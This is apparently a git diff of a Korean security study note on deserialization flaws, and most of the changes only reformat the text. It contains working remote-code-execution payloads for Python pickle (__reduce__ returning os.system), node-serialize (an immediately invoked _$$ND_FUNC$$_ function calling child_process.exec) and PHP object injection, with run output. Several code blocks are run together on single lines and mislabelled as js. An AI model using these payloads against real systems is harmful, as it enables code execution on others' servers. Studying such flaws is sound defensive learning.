@@ -515,8 +515,7 @@ if(!empty($_FILES['file'])){
   ```
 
   
-
-# **Business Logic Vulnerability (비즈니스 로직 취약점)**
+# Business Logic Vulnerability (비즈니스 로직 취약점)
 
 : 인젝션, 파일 관련 취약점들과는 다르게 정상적인 흐름을 악용하는 것을 의미
 
@@ -684,7 +683,8 @@ if(!empty($_FILES['file'])){
     * 직렬화/역직렬화 예시 코드
 
     ```js
-    import pickleclass TestClass:  def __init__(self, a, b):    self.A = a    self.B = b# TestClass 생성, ClassA로 할당ClassA = TestClass(31337,10001)# ClassA 직렬화ClassA_dump = pickle.dumps(ClassA)print(ClassA_dump)# ClassA 역직렬화, ClassB로 할당ClassB = pickle.loads(ClassA_dump)print(ClassB.A, ClassB.B)
+    import pickleclass TestClass:  def __init__(self, a, b):    self.A = a    self.B = b# TestClass 생성, ClassA로 할당ClassA = TestClass(31337,10001)
+    # ClassA 직렬화ClassA_dump = pickle.dumps(ClassA)print(ClassA_dump)# ClassA 역직렬화, ClassB로 할당ClassB = pickle.loads(ClassA_dump)print(ClassB.A, ClassB.B)
     ```
 
     - 실행 결과
@@ -702,7 +702,8 @@ if(!empty($_FILES['file'])){
     - Python deserialize 취약점 예시 코드
 
     ```js
-    import pickleimport osclass TestClass:  def __reduce__(self):  	return os.system, ("id", )ClassA = TestClass()# ClassA 직렬화ClassA_dump = pickle.dumps(ClassA)print(ClassA_dump)# 역직렬화pickle.loads(ClassA_dump)
+    import pickleimport osclass TestClass:  def __reduce__(self):  	return os.system, ("id", )ClassA = TestClass()
+    # ClassA 직렬화ClassA_dump = pickle.dumps(ClassA)print(ClassA_dump)# 역직렬화pickle.loads(ClassA_dump)
     ```
 
     - 실행 결과
@@ -720,7 +721,8 @@ if(!empty($_FILES['file'])){
        - serialize 예시 코드
 
        ```js
-       var serialize = require('node-serialize');x = {	test : function(){ return 'Hello'; }};console.log(serialize.serialize(x));/*{"test":"_$$ND_FUNC$$_function(){ return 'Hello'; }"}*/
+       var serialize = require('node-serialize');x = {	test : function(){ return 'Hello'; }};console.log(serialize.serialize(x));
+       /*{"test":"_$$ND_FUNC$$_function(){ return 'Hello'; }"}*/
        ```
 
        함수를 포함하는 object를 직렬화 하면 위와 같은 결과가 나옵니다.
@@ -729,7 +731,8 @@ if(!empty($_FILES['file'])){
        
 
        ```js
-       serialize_func_1 = {"test":"_$$ND_FUNC$$_function(){ return 'Hello'; }"}console.log(serialize.unserialize(serialize_func_1));/*{ test: [Function (anonymous)] }*/serialize.unserialize(serialize_func_1)['test']()/*'Hello'*/
+       serialize_func_1 = {"test":"_$$ND_FUNC$$_function(){ return 'Hello'; }"}console.log(serialize.unserialize(serialize_func_1));
+       /*{ test: [Function (anonymous)]        }*/serialize.unserialize(serialize_func_1)['test']()/*'Hello'*/
        ```
 
        직렬화된 object 값을 역직렬화 시키면 원래 object 형태로 나옴
@@ -737,7 +740,8 @@ if(!empty($_FILES['file'])){
        
 
        ```js
-       serialize_func_2 = {"test":"_$$ND_FUNC$$_function(){ return 'Hello'; }()"}console.log(serialize.unserialize(serialize_func_2));/*{ test: 'Hello' }*/
+       serialize_func_2 = {"test":"_$$ND_FUNC$$_function(){ return 'Hello'; }()"}console.log(serialize.unserialize(serialize_func_2));
+       /*{ test: 'Hello' }*/
        ```
 
        직렬화된 object의 결과에서 내부에 포함된 함수가 역직렬화 과정에서 실행되게 `()`를 붙여 실행하면 역직렬화 과정에서 함수가 실행되어 결과가 반영되는것 을 확인할 수 있음
@@ -747,7 +751,12 @@ if(!empty($_FILES['file'])){
        - 원격 코드 실행 페이로드
 
        ```js
-       var serialize = require('node-serialize');serialize_exploit_func = {"test":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"}console.log(serialize.unserialize(serialize_exploit_func));/*uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)*/
+       var serialize = require('node-serialize');
+       serialize_exploit_func = {"test":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr)
+       { console.log(stdout) });
+       }()"
+       }
+       console.log(serialize.unserialize(serialize_exploit_func));/*uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)*/
        ```
 
     3. **PHP**
@@ -757,7 +766,10 @@ if(!empty($_FILES['file'])){
        아래는 클래스의 변수를 조작하여 연계가 가능한 취약한 코드와 공격 예시
 
        ```js
-       <?phpclass Test{  var $func_name = "var_dump";  var $argv = "test";  function __destruct(){    call_user_func($this->func_name, $this->argv);  }}$obj = new Test();$serialize_Data = 'O:4:"Test":2:{s:9:"func_name";s:6:"system";s:4:"argv";s:2:"id";}';$obj = unserialize($serialize_Data);/*string(4) "test"uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)*/
+       <?phpclass Test{  var $func_name = "var_dump";  var $argv = "test";  function __destruct(){    
+       call_user_func($this->func_name, $this->argv);  
+       }}$obj = new Test();$serialize_Data = 'O:4:"Test":2:{s:9:"func_name";s:6:"system";s:4:"argv";s:2:"id";}';
+       $obj = unserialize($serialize_Data);/*string(4) "test"uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)*/
        ```
 
 ## PHP
